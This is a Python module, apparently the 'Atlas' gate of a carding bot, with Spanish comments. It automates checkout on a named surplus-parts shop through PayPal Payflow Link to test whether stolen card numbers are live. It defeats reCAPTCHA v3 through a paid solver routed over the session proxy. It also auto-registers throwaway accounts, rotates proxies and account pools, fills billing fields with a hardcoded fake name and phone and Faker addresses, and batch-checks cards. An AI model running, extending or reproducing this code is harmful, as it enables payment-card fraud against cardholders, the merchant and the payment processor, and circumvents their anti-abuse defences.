"""Gate Atlas Payflow - Verificación de tarjetas vía Eastern Surplus + PayPal Payflow Link.

Flujo medido (HAR + compra real orden 22748, USD 5.30):

    Login manual con cuenta del pool
      -> Shop/ShoppingCart (btnCheckOut)
      -> Shop/Checkout (btnReviewOrder)
      -> Shop/ReviewOrder (chkTermsOfUse -> rblDeliveryMethod$1 -> btnCompleteOrder + reCAPTCHA v3)
      -> 302 SecurePages/PayFlowProDialog?SecureToken=...&secureTokenId=...
      -> GET payflowlink.paypal.com/?SECURETOKEN=...&SECURETOKENID=...
      -> POST payflowlink.paypal.com/processTransaction.do

CLAVE: el postback de btnCompleteOrder EXIGE un token de reCAPTCHA v3
invisible (sitekey 6Lf03wwrAAAAAG4fCR5lNXKUf-aIkr-hPf7_d6C2, action
'homepage'). Sin token, el sitio devuelve el banner rojo:

    "Your recaptcha score is too low. Please reload the page and try again."

y no emite SecureToken. El token se pide al solver POR EL MISMO PROXY de
la sesión (si resuelve desde otra IP, el score cae y el sitio lo rechaza).
"""
import asyncio
import html
import logging
import os
import random
import re
import time
import urllib.parse
from datetime import datetime
from pathlib import Path
from typing import Callable, Dict, List, Optional, Tuple

import cloudscraper
import requests
from faker import Faker

from bot.config import gate_proxy

logger = logging.getLogger(__name__)

SITE = "https://www.easternsurplus.net"
PRODUCT_URL = f"{SITE}/PartDetails/321/COM-3207-Round-Red-Reflector-set-pair"
PRODUCT_CONDITION_VALUE = "28"
CART_URL = f"{SITE}/Shop/ShoppingCart.aspx"
CHECKOUT_URL = f"{SITE}/Shop/Checkout"
REVIEW_URL = f"{SITE}/Shop/ReviewOrder"
LOGIN_URL = f"{SITE}/Login"
PAYFLOW_LINK = "https://payflowlink.paypal.com/"

# --- reCAPTCHA v3 (obligatorio en btnCompleteOrder) ---
ATLAS_RECAPTCHA_SITEKEY = "6Lf03wwrAAAAAG4fCR5lNXKUf-aIkr-hPf7_d6C2"
ATLAS_RECAPTCHA_ACTION = "homepage"
ATLAS_2CAPTCHA_KEY = os.environ.get("ATLAS_2CAPTCHA_KEY", "")
ATLAS_RECAPTCHA_MIN_SCORE = float(os.environ.get("ATLAS_RECAPTCHA_MIN_SCORE", "0.7"))
ATLAS_RECAPTCHA_RETRIES = int(os.environ.get("ATLAS_RECAPTCHA_RETRIES", "3"))
ATLAS_RECAPTCHA_TIMEOUT = int(os.environ.get("ATLAS_RECAPTCHA_TIMEOUT", "180"))

# Texto exacto del banner rojo del sitio cuando el token va vacío o flojo.
SCORE_LOW_MARKERS = (
    "recaptcha score is too low",
    "score is too low",
    "please reload the page and try again",
)

ATLAS_ACCOUNTS_FILE = Path("data/gates/atlas_accounts.txt")
ATLAS_BAD_ACCOUNTS_FILE = Path("data/atlas_bad_accounts.jsonl")
ATLAS_AUTO_REGISTER = True

_UA = (
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
    "(KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
)

_PANEL = (
    "ctl00$ctl00$globalContent$mainContent$"
    "ctl00$ctl00$globalContent$mainContent$rdAjaxPanelPanel"
)
_RAD = "ctl00_ctl00_globalContent_mainContent_rdAjaxPanel"


# --------------------------------------------------------------------------
# Solver reCAPTCHA v3
# --------------------------------------------------------------------------
def _proxy_for_solver(proxy_url: Optional[str]) -> Dict[str, str]:
    """2Captcha espera 'user:pass@host:port' sin esquema, y proxytype aparte."""
    if not proxy_url:
        return {}
    p = urllib.parse.urlparse(proxy_url)
    if not p.hostname:
        return {}
    host = p.hostname + (f":{p.port}" if p.port else "")
    if p.username:
        host = f"{urllib.parse.unquote(p.username)}:{urllib.parse.unquote(p.password or '')}@{host}"
    return {"proxy": host, "proxytype": "HTTP"}


def solve_recaptcha_v3(
    page_url: str,
    proxy_url: Optional[str] = None,
    action: str = ATLAS_RECAPTCHA_ACTION,
    min_score: float = ATLAS_RECAPTCHA_MIN_SCORE,
    timeout: int = ATLAS_RECAPTCHA_TIMEOUT,
) -> Optional[str]:
    """Pide un token v3 al solver, resolviendo por la MISMA IP del flujo."""
    if not ATLAS_2CAPTCHA_KEY:
        logger.warning("Atlas: sin ATLAS_2CAPTCHA_KEY, no hay token de reCAPTCHA")
        return None
    params = {
        "key": ATLAS_2CAPTCHA_KEY,
        "method": "userrecaptcha",
        "version": "v3",
        "googlekey": ATLAS_RECAPTCHA_SITEKEY,
        "pageurl": page_url,
        "action": action,
        "min_score": str(min_score),
        "json": 1,
    }
    params.update(_proxy_for_solver(proxy_url))
    try:
        r = requests.get("https://2captcha.com/in.php", params=params, timeout=30)
        j = r.json()
    except Exception as exc:
        logger.warning("Atlas: in.php del solver falló: %s", exc)
        return None
    if str(j.get("status")) != "1":
        logger.warning("Atlas: solver rechazó el trabajo: %s", j.get("request"))
        return None
    rid = j["request"]
    t0 = time.time()
    while time.time() - t0 < timeout:
        time.sleep(5)
        try:
            rr = requests.get(
                "https://2captcha.com/res.php",
                params={"key": ATLAS_2CAPTCHA_KEY, "action": "get", "id": rid, "json": 1},
                timeout=30,
            )
            jj = rr.json()
        except Exception:
            continue
        if str(jj.get("status")) == "1":
            logger.info("Atlas: token v3 obtenido (%d chars)", len(jj["request"]))
            return jj["request"]
        if jj.get("request") not in ("CAPCHA_NOT_READY", "CAPTCHA_NOT_READY"):
            logger.warning("Atlas: solver devolvió %s", jj.get("request"))
            return None
    logger.warning("Atlas: timeout esperando token v3")
    return None


def _is_score_low(body: str) -> bool:
    low = (body or "").lower()
    return any(m in low for m in SCORE_LOW_MARKERS)


# --------------------------------------------------------------------------
# Pool de cuentas
# --------------------------------------------------------------------------
def _load_atlas_accounts() -> List[Tuple[str, str]]:
    bad: set = set()
    try:
        import json as _json

        with open(ATLAS_BAD_ACCOUNTS_FILE, encoding="utf-8") as fh:
            for line in fh:
                try:
                    bad.add(_json.loads(line).get("email", "").lower())
                except Exception:
                    pass
    except FileNotFoundError:
        pass
    accounts: List[Tuple[str, str]] = []
    try:
        with open(ATLAS_ACCOUNTS_FILE, encoding="utf-8") as fh:
            for line in fh:
                line = line.strip()
                if not line or line.startswith("#") or "|" not in line:
                    continue
                email, pwd = line.split("|", 1)
                email, pwd = email.strip(), pwd.strip()
                if email and pwd and email.lower() not in bad:
                    accounts.append((email, pwd))
    except FileNotFoundError:
        pass
    return accounts


def _mark_atlas_bad(email: str, reason: str) -> None:
    try:
        import json as _json

        ATLAS_BAD_ACCOUNTS_FILE.parent.mkdir(parents=True, exist_ok=True)
        with open(ATLAS_BAD_ACCOUNTS_FILE, "a", encoding="utf-8") as fh:
            fh.write(_json.dumps({"ts": time.time(), "email": email, "reason": reason}) + "\n")
        logger.warning("Cuenta Atlas marcada como mala: %s (%s)", email, reason)
    except Exception as exc:
        logger.debug("No se pudo marcar cuenta mala: %s", exc)


def _add_atlas_account(email: str, pwd: str) -> None:
    try:
        ATLAS_ACCOUNTS_FILE.parent.mkdir(parents=True, exist_ok=True)
        with open(ATLAS_ACCOUNTS_FILE, "a", encoding="utf-8") as fh:
            fh.write(f"\n{email}|{pwd}\n")
        logger.info("Cuenta Atlas generada y agregada: %s", email)
    except Exception as exc:
        logger.warning("No se pudo agregar cuenta Atlas: %s", exc)


def _atlas_register_account(seccion, get_h, post_h) -> Optional[Tuple[str, str]]:
    """Genera una cuenta con EmailApi y la registra (sin correo de verificación)."""
    try:
        from bot.services.amazon_gen.credsBypass import TempMail
    except Exception as exc:
        logger.warning("Sin cliente EmailApi para Atlas: %s", exc)
        return None
    mail = TempMail()
    try:
        addr = mail.getAddr()
    except Exception as exc:
        logger.warning("EmailApi no entregó correo para Atlas: %s", exc)
        return None
    email = (addr.get("number") or addr.get("activationId") or "").strip().lower()
    if "@" not in email:
        return None
    pwd = f"Atlas{random.randint(1000, 9999)}!x"
    try:
        r = seccion.get(LOGIN_URL, headers=get_h, timeout=30)
        data = _form_fields(r.text)
        data["__EVENTTARGET"] = "ctl00$ctl00$globalContent$mainContent$btnCreateAccount"
        data["__EVENTARGUMENT"] = ""
        for key in list(data):
            low = key.lower()
            if low.endswith("txtemailaddress"):
                data[key] = email
            elif low.endswith("txtpassword"):
                data[key] = pwd
        seccion.post(
            LOGIN_URL,
            data=urllib.parse.urlencode(data),
            headers={**post_h, "referer": LOGIN_URL, "origin": SITE},
            timeout=30,
            allow_redirects=True,
        )
        r0 = seccion.get(LOGIN_URL, headers=get_h, timeout=30)
        data = _form_fields(r0.text)
        data["__EVENTTARGET"] = "ctl00$ctl00$globalContent$mainContent$btnLogin"
        data["__EVENTARGUMENT"] = ""
        data["ctl00$ctl00$ScriptMan"] = f"{_PANEL}|ctl00$ctl00$globalContent$mainContent$btnLogin"
        data["RadAJAXControlID"] = _RAD
        data["__ASYNCPOST"] = "true"
        for key in list(data):
            low = key.lower()
            if low.endswith("txtemailaddress"):
                data[key] = email
            elif low.endswith("txtpassword"):
                data[key] = pwd
        seccion.post(
            LOGIN_URL,
            data=urllib.parse.urlencode(data),
            headers={**post_h, "referer": LOGIN_URL, "origin": SITE},
            timeout=30,
            allow_redirects=True,
        )
        if any("eastern" in n.lower() for n in seccion.cookies.keys()):
            _add_atlas_account(email, pwd)
            return email, pwd
        _mark_atlas_bad(email, "registro sin login")
    except Exception as exc:
        logger.debug("Registro Atlas falló para %s: %s", email, exc)
    return None


def atlas_pool_health() -> Dict[str, object]:
    total = 0
    try:
        with open(ATLAS_ACCOUNTS_FILE, encoding="utf-8") as fh:
            for line in fh:
                line = line.strip()
                if line and not line.startswith("#") and "|" in line:
                    total += 1
    except FileNotFoundError:
        pass
    bad = 0
    try:
        with open(ATLAS_BAD_ACCOUNTS_FILE, encoding="utf-8") as fh:
            bad = sum(1 for line in fh if line.strip())
    except FileNotFoundError:
        pass
    return {"total": total, "bad": bad, "healthy": len(_load_atlas_accounts())}


# --------------------------------------------------------------------------
# Utilidades
# --------------------------------------------------------------------------
def _debug_save_receipt(step: str, status_code: int, body: str) -> None:
    try:
        debug_dir = Path("data/atlas_debug")
        debug_dir.mkdir(parents=True, exist_ok=True)
        redacted = re.sub(r"\d{12,19}", "[PAN]", body or "")
        content = f"STEP: {step}\nSTATUS: {status_code}\n--- BODY ---\n{redacted[:20000]}\n"
        (debug_dir / f"{step}_{int(time.time())}.txt").write_text(content, encoding="utf-8")
    except Exception:
        pass


def _learn_atlas_text(body: str, result: str = "", respmsg: str | None = None) -> None:
    """Diccionario vivo de banners/textos del comercio (incluye el de score)."""
    try:
        from bs4 import BeautifulSoup
    except Exception:
        return
    try:
        soup = BeautifulSoup(body or "", "html.parser")
        texts = []
        for el in soup.find_all(["div", "span", "p", "h1", "h2", "h3", "li", "td"]):
            cls = " ".join(el.get("class", [])).lower()
            tid = (el.get("id") or "").lower()
            if any(
                k in cls or k in tid
                for k in ("success", "error", "alert", "danger", "warning", "notice", "message", "banner")
            ):
                t = el.get_text(" ", strip=True)
                if t and len(t) < 500:
                    texts.append(t)
        if not texts:
            return
        import json as _json

        seen = set()
        try:
            with open("data/atlas_texts.jsonl", encoding="utf-8") as fh:
                for line in fh:
                    try:
                        seen.add(_json.loads(line).get("text", ""))
                    except Exception:
                        pass
        except FileNotFoundError:
            pass
        with open("data/atlas_texts.jsonl", "a", encoding="utf-8") as fh:
            for t in dict.fromkeys(texts):
                if t not in seen:
                    fh.write(
                        _json.dumps(
                            {"ts": time.time(), "result": result, "respmsg": respmsg or "", "text": t},
                            ensure_ascii=False,
                        )
                        + "\n"
                    )
                    seen.add(t)
    except Exception as exc:
        logger.debug("No se pudo aprender texto atlas: %s", exc)


def _pick_proxy() -> Tuple[Optional[dict], Optional[str]]:
    """Proxy del flujo: sticky MX primero, rotatorio si el sticky no existe."""
    for pool in ("mx", "rot"):
        proxy_url = gate_proxy(pool)
        if proxy_url:
            return {"http": proxy_url, "https": proxy_url}, proxy_url
    return None, None


def _swap_proxy(seccion, pool: str = "rot") -> Optional[str]:
    proxy_url = gate_proxy(pool)
    if not proxy_url:
        return None
    seccion.proxies = {"http": proxy_url, "https": proxy_url}
    return proxy_url


def _form_fields(html_text: str) -> dict:
    from bs4 import BeautifulSoup

    soup = BeautifulSoup(html_text or "", "html.parser")
    data: dict = {}
    for inp in soup.find_all("input"):
        name = inp.get("name")
        if not name:
            continue
        if (inp.get("type") or "").lower() in ("submit", "button"):
            continue
        data[name] = inp.get("value", "")
    for sel in soup.find_all("select"):
        name = sel.get("name")
        if not name:
            continue
        opts = sel.find_all("option")
        chosen = [o for o in opts if o.get("selected")]
        data[name] = (
            chosen[0].get("value", "") if chosen else (opts[0].get("value", "") if opts else "")
        )
    return data


def procesar_y_validar(card: str) -> Optional[Tuple[str, str, str, str]]:
    def es_fecha_anterior(mes, ano):
        return f"{'20' + ano}-{mes:02}" >= datetime.now().strftime("%Y-%m")

    KEYS = "/#%&()=?¿!¡*[]{}-_.:,;|@+"
    for KEY in KEYS:
        card = card.replace(KEY, "|")
    card = card.replace(" ", "|")

    match = re.search(r"\d{15,16}\|\d{2}\|\d{2,4}\|\d{3,4}", card)
    if not match:
        return None
    values = card.split("|")
    if len(values) < 4:
        return None
    cc_number = values[0]
    mes = values[1]
    ano = values[2]
    ano = ano[2:] if len(ano) > 2 else ano
    cvv = values[3][0:4]
    if not es_fecha_anterior(mes, ano):
        return None
    return cc_number, mes, ano, cvv


def parseX(data, start, end):
    try:
        star = data.index(start) + len(start)
        last = data.index(end, star)
        return data[star:last]
    except ValueError:
        return None


def _err(tiempo: str) -> Dict[str, str]:
    return {"status": "⚠️ Error", "message": "Error, avisar a un admin.", "time": tiempo}


# --------------------------------------------------------------------------
# Gate
# --------------------------------------------------------------------------
async def atlas_check(card_data: str, user_id: Optional[int] = None) -> Dict[str, str]:
    logger.info(f"Atlas gate: inicio check user_id={user_id}")
    loop = asyncio.get_event_loop()

    def _run() -> Dict[str, str]:
        inicio = datetime.now()

        def _t():
            return f"{float((datetime.now() - inicio).total_seconds()):0.2f}"

        try:
            resultado = procesar_y_validar(card_data)
            if resultado is None:
                return {
                    "status": "⚠️ Error",
                    "message": "Formato de tarjeta inválido. Usa: cc|mes|año|cvv",
                    "time": "0.00",
                }
            cc_number, mes, ano, cvv = resultado

            faker = Faker()
            nombre, apellido = "Arturo", "Ibarra"
            phone = "8120095412"
            street = faker.street_address() or "Waterbury Court"
            city = faker.city() or "San Jose"
            state_abbr = faker.state_abbr() or "CA"
            zip_code = re.sub(r"\D", "", faker.postcode() or "")[:5] or "95117"

            seccion = cloudscraper.create_scraper(
                browser={"browser": "chrome", "platform": "windows", "mobile": False},
                delay=2,
            )
            proxy, proxy_url = _pick_proxy()
            if proxy:
                seccion.proxies = proxy

            get_h = {
                "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
                "accept-language": "en-US,en;q=0.9",
                "upgrade-insecure-requests": "1",
                "user-agent": _UA,
            }
            post_h = {
                "accept": "*/*",
                "accept-language": "en-US,en;q=0.9",
                "cache-control": "no-cache",
                "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
                "user-agent": _UA,
                "x-microsoftajax": "Delta=true",
                "x-requested-with": "XMLHttpRequest",
            }

            def _async(data, target):
                data["__EVENTTARGET"] = target
                data["__EVENTARGUMENT"] = ""
                data["ctl00$ctl00$ScriptMan"] = f"{_PANEL}|{target}"
                data["RadAJAXControlID"] = _RAD
                data["__ASYNCPOST"] = "true"
                return data

            # --- Paso 1: login con rotación del pool ---
            try:
                r0 = seccion.get(LOGIN_URL, headers=get_h, timeout=30)
            except Exception:
                if not _swap_proxy(seccion, "rot"):
                    raise
                proxy_url = seccion.proxies.get("https")
                r0 = seccion.get(LOGIN_URL, headers=get_h, timeout=30)

            login_ok = False
            for _attempt, (_email, _pwd) in enumerate(_load_atlas_accounts()):
                if _attempt:
                    r0 = seccion.get(LOGIN_URL, headers=get_h, timeout=30)
                data = _form_fields(r0.text)
                data = _async(data, "ctl00$ctl00$globalContent$mainContent$btnLogin")
                for key in list(data):
                    low = key.lower()
                    if low.endswith("txtemailaddress"):
                        data[key] = _email
                    elif low.endswith("txtpassword"):
                        data[key] = _pwd
                seccion.post(
                    LOGIN_URL,
                    data=urllib.parse.urlencode(data),
                    headers={**post_h, "referer": LOGIN_URL, "origin": SITE},
                    timeout=30,
                    allow_redirects=True,
                )
                if any("eastern" in n.lower() for n in seccion.cookies.keys()):
                    login_ok = True
                    break
                _mark_atlas_bad(_email, "login sin cookie .EasternSurplus")
                try:
                    seccion.cookies.clear()
                except Exception:
                    pass

            if not login_ok and ATLAS_AUTO_REGISTER:
                if _atlas_register_account(seccion, get_h, post_h):
                    login_ok = True
            if not login_ok:
                return _err(_t())

            # --- Paso 2: carrito limpio + ficha + condición + Add To Cart ---
            r0c = seccion.get(CART_URL, headers=get_h, timeout=30)
            try:
                _rm = re.search(r'name="(ctl00\$[^"]*btnRemove)"', r0c.text)
                while _rm and "no results to display" not in r0c.text.lower():
                    _d = _async(_form_fields(r0c.text), _rm.group(1))
                    seccion.post(
                        CART_URL,
                        data=urllib.parse.urlencode(_d),
                        headers={**post_h, "referer": CART_URL, "origin": SITE},
                        timeout=30,
                        allow_redirects=True,
                    )
                    r0c = seccion.get(CART_URL, headers=get_h, timeout=30)
                    _rm = re.search(r'name="(ctl00\$[^"]*btnRemove)"', r0c.text)
            except Exception:
                pass

            r1 = seccion.get(PRODUCT_URL, headers=get_h, timeout=40)
            data = _form_fields(r1.text)
            cond_key = next((k for k in data if k.lower().endswith("ddlcondition")), None)
            if cond_key:
                data[cond_key] = PRODUCT_CONDITION_VALUE
            m_btn = re.search(r'name="(ctl00\$[^"]*btnAddToCart)"', r1.text)
            if not m_btn:
                return _err(_t())
            data = _async(data, m_btn.group(1))
            seccion.post(
                PRODUCT_URL,
                data=urllib.parse.urlencode(data),
                headers={**post_h, "referer": PRODUCT_URL, "origin": SITE},
                timeout=30,
                allow_redirects=True,
            )

            # --- Paso 3: carrito (Update -> Estimate -> CheckOut) ---
            r3 = seccion.get(CART_URL, headers=get_h, timeout=30)
            if "no results to display" in r3.text.lower():
                return _err(_t())
            data = _form_fields(r3.text)
            qty_key = next((k for k in data if "txtProductQty" in k), None)
            if qty_key:
                data[qty_key] = "1"
            data = _async(data, "ctl00$ctl00$globalContent$mainContent$btnUpdate")
            seccion.post(
                CART_URL,
                data=urllib.parse.urlencode(data),
                headers={**post_h, "referer": CART_URL, "origin": SITE},
                timeout=30,
                allow_redirects=True,
            )
            r3b = seccion.get(CART_URL, headers=get_h, timeout=30)
            data = _form_fields(r3b.text)
            if qty_key and qty_key in data:
                data[qty_key] = "1"
            for k in list(data):
                low = k.lower()
                if low.endswith("ddlcountry"):
                    data[k] = "UNITED STATES"
                elif low.endswith("txtzipcode") and not data[k]:
                    data[k] = zip_code
            data = _async(data, "ctl00$ctl00$globalContent$mainContent$btnCalculateShipping")
            seccion.post(
                CART_URL,
                data=urllib.parse.urlencode(data),
                headers={**post_h, "referer": CART_URL, "origin": SITE},
                timeout=30,
                allow_redirects=True,
            )
            r3c = seccion.get(CART_URL, headers=get_h, timeout=30)
            data = _async(_form_fields(r3c.text), "ctl00$ctl00$globalContent$mainContent$btnCheckOut")
            seccion.post(
                CART_URL,
                data=urllib.parse.urlencode(data),
                headers={**post_h, "referer": CART_URL, "origin": SITE},
                timeout=30,
                allow_redirects=True,
            )

            # --- Paso 4: checkout -> review ---
            r5 = seccion.get(CHECKOUT_URL, headers=get_h, timeout=30)
            data = _async(_form_fields(r5.text), "ctl00$ctl00$globalContent$mainContent$btnReviewOrder")
            seccion.post(
                CHECKOUT_URL,
                data=urllib.parse.urlencode(data),
                headers={**post_h, "referer": CHECKOUT_URL, "origin": SITE},
                timeout=30,
                allow_redirects=True,
            )

            # --- Paso 5: review (Terms -> Pickup) ---
            r7 = seccion.get(REVIEW_URL, headers=get_h, timeout=30)
            data = _form_fields(r7.text)
            data["ctl00$ctl00$globalContent$mainContent$chkTermsOfUse"] = "on"
            data["ctl00$ctl00$globalContent$mainContent$rblDeliveryMethod"] = "2"
            data = _async(data, "ctl00$ctl00$globalContent$mainContent$chkTermsOfUse")
            r7b = seccion.post(
                REVIEW_URL,
                data=urllib.parse.urlencode(data),
                headers={**post_h, "referer": REVIEW_URL, "origin": SITE},
                timeout=30,
                allow_redirects=True,
            )
            ship_html = r7b.text if isinstance(r7b.text, str) else r7.text
            data = _form_fields(ship_html)
            data["ctl00$ctl00$globalContent$mainContent$chkTermsOfUse"] = "on"
            data["ctl00$ctl00$globalContent$mainContent$rblDeliveryMethod"] = "2"
            data.pop("ctl00$ctl00$globalContent$mainContent$ddlShippingOptions", None)
            data = _async(data, "ctl00$ctl00$globalContent$mainContent$rblDeliveryMethod$1")
            r7c = seccion.post(
                REVIEW_URL,
                data=urllib.parse.urlencode(data),
                headers={**post_h, "referer": REVIEW_URL, "origin": SITE},
                timeout=30,
                allow_redirects=True,
            )
            base_html = r7c.text if isinstance(r7c.text, str) else ship_html

            # --- Paso 6: btnCompleteOrder CON TOKEN v3 (con reintento) ---
            recaptcha_token = solve_recaptcha_v3(REVIEW_URL, proxy_url)
            if not recaptcha_token:
                return _err(_t())

            r8 = None
            dialog_url = ""
            m = None
            m2 = None
            for intento in range(ATLAS_RECAPTCHA_RETRIES):
                data = _form_fields(base_html)
                data["ctl00$ctl00$globalContent$mainContent$chkTermsOfUse"] = "on"
                data["ctl00$ctl00$globalContent$mainContent$rblDeliveryMethod"] = "2"
                data.pop("ctl00$ctl00$globalContent$mainContent$ddlShippingOptions", None)
                data["g-recaptcha-response"] = recaptcha_token
                data = _async(data, "ctl00$ctl00$globalContent$mainContent$btnCompleteOrder")

                r8 = seccion.post(
                    REVIEW_URL,
                    data=urllib.parse.urlencode(data),
                    headers={**post_h, "referer": REVIEW_URL, "origin": SITE},
                    timeout=30,
                    allow_redirects=False,
                )
                dialog_url = r8.headers.get("location", "") or ""
                m = re.search(r"SecureToken=([^&\"']+)", r8.text or "")
                m2 = re.search(r"secureTokenId=([^&\"']+)", r8.text or "", re.I)
                if (dialog_url and "PayFlowProDialog" in dialog_url) or m:
                    break

                body = r8.text or ""
                _learn_atlas_text(body)
                if not _is_score_low(body):
                    logger.warning("Atlas: btnCompleteOrder sin SecureToken y sin banner de score")
                    break
                logger.info("Atlas: score bajo en intento %d, token nuevo", intento + 1)
                base_html = body or base_html
                time.sleep(random.uniform(3, 5))
                recaptcha_token = solve_recaptcha_v3(REVIEW_URL, proxy_url)
                if not recaptcha_token:
                    break

            if (not dialog_url or "PayFlowProDialog" not in dialog_url) and not m:
                return _err(_t())
            if dialog_url.startswith("/"):
                dialog_url = SITE + dialog_url

            # --- Paso 7: PayFlowProDialog -> Payflow Link ---
            r9 = seccion.get(dialog_url, headers=get_h, timeout=30)
            sec_match = re.search(r"[Ss]ecure[Tt]oken=([^&\"']+)", r9.text)
            sid_match = re.search(r"[Ss]ecure[Tt]oken[Ii]d=([^&\"']+)", r9.text)
            securetoken = sec_match.group(1) if sec_match else (m.group(1) if m else "")
            securetokenid = sid_match.group(1) if sid_match else (m2.group(1) if m2 else "")
            if not securetoken or not securetokenid:
                return _err(_t())

            headers = {
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                "Accept-Language": "en-US,en;q=0.9",
                "Referer": SITE + "/",
                "Upgrade-Insecure-Requests": "1",
                "User-Agent": _UA,
            }
            r10 = seccion.get(
                PAYFLOW_LINK,
                params={"SecureTokenID": securetokenid, "SecureToken": securetoken},
                headers=headers,
                timeout=30,
            )
            csrf_match = re.search(r'name="CSRF_TOKEN"[^>]*value="([^"]+)"', r10.text)
            if not csrf_match:
                return _err(_t())
            csrf = csrf_match.group(1)

            headers = {
                "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                "accept-language": "en-US,en;q=0.9",
                "cache-control": "max-age=0",
                "content-type": "application/x-www-form-urlencoded",
                "origin": "https://payflowlink.paypal.com",
                "referer": f"https://payflowlink.paypal.com/?SecureTokenID={securetokenid}&SecureToken={securetoken}",
                "upgrade-insecure-requests": "1",
                "user-agent": _UA,
            }
            data_pf = [
                ("subaction", ""), ("CARDNUM", cc_number),
                ("EXPMONTH", mes), ("EXPYEAR", ano),
                ("startdate_month", ""), ("startdate_year", ""), ("issue_number", ""),
                ("METHOD", "C"), ("PAYMETHOD", "C"),
                ("FIRST_NAME", nombre), ("LAST_NAME", apellido), ("template", ""),
                ("ADDRESS", street), ("CITY", city), ("STATE", state_abbr),
                ("ZIP", zip_code), ("COUNTRY", "US"), ("PHONE", ""), ("EMAIL", ""),
                ("SHIPPING_FIRST_NAME", nombre), ("SHIPPING_LAST_NAME", apellido),
                ("ADDRESSTOSHIP", street), ("CITYTOSHIP", city), ("STATETOSHIP", state_abbr),
                ("ZIPTOSHIP", zip_code), ("COUNTRYTOSHIP", "US"),
                ("PHONETOSHIP", ""), ("EMAILTOSHIP", ""),
                ("TYPE", "A"), ("SHIPAMOUNT", "0.00"), ("TAX", "0.00"), ("VERBOSITY", "HIGH"),
                ("flag3dSecure", ""), ("CURRENCY", "USD"), ("swipeData", "0"),
                ("SECURETOKEN", securetoken), ("SECURETOKENID", securetokenid),
                ("PARMLIST", ""), ("MODE", ""), ("CSRF_TOKEN", csrf),
                ("referringTemplate", "minlayout"),
            ]
            r11 = seccion.post(
                "https://payflowlink.paypal.com/processTransaction.do",
                headers=headers,
                data=data_pf,
                timeout=40,
            )

            tiempo = _t()
            source = r11.text or ""
            _debug_save_receipt("s11_receipt", r11.status_code, source)

            result = parseX(source, 'name="RESULT" value="', '"') or ""
            respmsg = parseX(source, 'name="RESPMSG" value="', '"/>')
            pnref = parseX(source, 'name="PNREF" value="', '"') or ""
            avsdata = parseX(source, 'name="AVSDATA" value="', '"/>')
            detail = f"RESULT={result} {respmsg or ''} | PNREF={pnref} | AVS: {avsdata or ''}".strip()

            confirmed = False
            back_body = ""
            try:
                m_act = re.search(r'<form[^>]*name="redirectForm"[^>]*action="([^"]+)"', source, re.I)
                if m_act:
                    back_url = html.unescape(m_act.group(1))
                    back_fields = {
                        mi.group(1): html.unescape(mi.group(2))
                        for mi in re.finditer(r'<input[^>]*name="([^"]+)"[^>]*value="([^"]*)"', source, re.I)
                    }
                    r12 = seccion.post(back_url, data=back_fields, timeout=40, allow_redirects=True)
                    back_body = r12.text or ""
                    _debug_save_receipt("s12_back", r12.status_code, back_body)
                    low12 = back_body.lower()
                    if "you have paid successfully" in low12 or "thank you for your order" in low12:
                        confirmed = True
            except Exception as exc:
                logger.debug("No se pudo confirmar el redirectForm: %s", exc)

            _learn_atlas_text(back_body or source, result, respmsg)

            if result.strip() == "0" or confirmed:
                return {"status": "✅ Live", "message": f"Tarjeta aprobada. {detail}", "time": tiempo}
            if result or "RESPMSG" in source:
                return {"status": "❌ Dead", "message": detail or "Tarjeta declinada.", "time": tiempo}
            return _err(tiempo)

        except Exception:
            logger.exception("Atlas gate: excepción no controlada")
            return _err(_t())

    return await loop.run_in_executor(None, _run)


async def atlas_check_multiple(
    cards: List[str],
    callback: Optional[Callable[[int, Dict[str, str], str, int], None]] = None,
    user_id: Optional[int] = None,
) -> List[Dict[str, str]]:
    clean = [c.strip() for c in cards if c.strip()][:10]
    results: List[Dict[str, str]] = []
    for i, card in enumerate(clean):
        result = await atlas_check(card, user_id)
        results.append(result)
        if callback:
            try:
                await callback(i, result, card, user_id or 0)
            except Exception:
                logger.exception("Error en callback de Atlas mass")
        if i < len(clean) - 1:
            await asyncio.sleep(5)
    return results


if __name__ == "__main__":
    import json
    import sys

    logging.basicConfig(level=logging.INFO, format="%(levelname)s %(message)s")
    logging.getLogger("urllib3").setLevel(logging.WARNING)
    card = sys.argv[1] if len(sys.argv) > 1 else "4242424242424242|12|2030|123"
    print(json.dumps(asyncio.run(atlas_check(card)), indent=2, ensure_ascii=False))
